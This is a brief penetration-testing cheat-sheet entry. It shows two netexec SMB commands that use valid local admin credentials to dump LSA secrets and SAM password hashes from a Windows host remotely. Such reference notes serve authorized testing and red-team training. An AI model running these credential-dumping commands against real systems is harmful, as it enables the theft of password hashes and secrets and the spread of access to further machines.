-- -
Dump the LSA and SAME with valid local admin credentials from attack box rather than needing to have a shell on the machine.
### LSA
```bash
netexec smb <ip> --local-auth -u <username> -p <passwd> --lsa
```
### SAM
```bash
netexec smb <ip> --local-auth -u <username> -p <password> --sam
```